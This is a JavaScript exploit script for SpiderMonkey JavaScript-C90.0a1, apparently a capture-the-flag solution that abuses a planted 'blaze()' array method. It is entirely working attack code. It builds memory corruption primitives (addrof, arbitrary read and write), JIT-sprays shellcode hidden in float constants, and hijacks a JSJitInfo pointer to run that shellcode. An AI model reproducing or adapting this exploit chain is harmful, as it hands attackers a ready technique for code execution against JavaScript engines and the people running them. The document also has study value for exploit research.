// Exploit by @ulexec for SpiderMonkey JavaScript-C90.0a1 - 23-04-2021

load('utils.js');
load('int64.js');
load('resolver.js');
 
var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function arb_write(addr, value) {
	x = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
	y = new Uint8Array(8);
	x.blaze();
	save = x[13];
	x[13] = itof(addr)
	y[0] = Number(value);
	x[13] = save;
}

function arb_w8(addr, value) {
	var i;
	value = BigInt(value);
	for (i = 0; i < 8; i ++) {
		v = BigInt(value & 0xffn);
		arb_write(addr, v);
		value = value >> 8n;
		addr += 1n;
	}
}

function arb_read(addr, size) {
	var a1 = new Array(1, 2, 3, 4);
	var a2 = new Uint8Array(8);
	a1.blaze();

	a1[13] = itof(addr)
	return a2.slice(0, size);
}

function arb_r1(addr) {
	v0 = arb_read(addr);
	return Number(v0[0]);
}

function arb_r2(addr) {
	v0 = arb_read(addr);
	pointer = BigInt(v0[0]) + (BigInt(v0[1]) << 8n);
	return pointer;
}

function arb_r4(addr) {
	v0 = arb_read(addr);
	pointer = BigInt(v0[0]) + (BigInt(v0[1]) << 8n) + (BigInt(v0[2]) << 16n) + (BigInt(v0[3]) << 24n);
	return pointer;
}

function arb_r8(addr) {
	v0 = arb_read(addr);
	pointer = BigInt(v0[0]) + (BigInt(v0[1]) << 8n) + (BigInt(v0[2]) << 16n) + (BigInt(v0[3]) << 24n) + (BigInt(v0[4]) << 32n) + (BigInt(v0[5]) << 40n);
	return pointer;
}

function addrof(obj) {
	var a1 = new Array(1, 2, 3, 4);
	var a2 = new Uint8Array(8);
	a1.blaze();	
	a1[14] = obj;
	return a2.slice(0, 8);
}

// Full RELRO Exploitaion abusing JIT engine
// Use constants to JIT shellcode
function shellcode(){
	find_me = 5.40900888e-315; // 0x41414141 flag in memory
	A = -6.828527034422786e-229;
	B = 8.568532312320605e+170;
	C = 1.4813365150669252e+248;
	D = -6.032447120847604e-264;
	E = -6.0391189260385385e-264;
	F = 1.0842822352493598e-25;
	G = 9.241363425014362e+44;
	H = 2.2104256869204514e+40;
	I = 2.4929675059396527e+40;
	J = 3.2459699498717e-310;
	K = 1.637926e-318;
}

// Searches from the JIT memory region to find the shellcode's flag 0x41414141
function find_shellcode_addr(addr) {
	while(true) { 
		let val = arb_r4(addr); 
		if(val == 0x41414141n) {
			addr = addr + 8n;
			return addr;
		}
		addr = addr + 1n;
	}
}

// JIT shellcode function
for(i=0;i<0x10000;i++) shellcode();

// Get Shellcode address
let shellcode_object = BigInt(Int64.fromJSValue(addrof(shellcode)));
let shellcode_jitinfo_ptr = arb_r8(shellcode_object+0x28n);
let shellcode_jitinfo = arb_r8(shellcode_jitinfo_ptr);
let shellcode_entry = find_shellcode_addr(shellcode_jitinfo);

console.log("[+] shellcode Object :\t\t0x"+shellcode_object.toString(16));
console.log("[+] shellcode JSJitInfo ptr:\t0x"+shellcode_jitinfo_ptr.toString(16));
console.log("[+] shellcode JSJitInfo:\t0x"+shellcode_jitinfo.toString(16));
console.log("[+] shellcode entry:\t\t0x"+shellcode_entry.toString(16));

// Overwritting jitinfo ptr with jit shellcode address
arb_w8(shellcode_jitinfo_ptr, shellcode_entry);

// This is for debuging purposes
Math.atan2(shellcode);
// Shellcode will call JSJitInfo ptr which we have overwritten
shellcode();

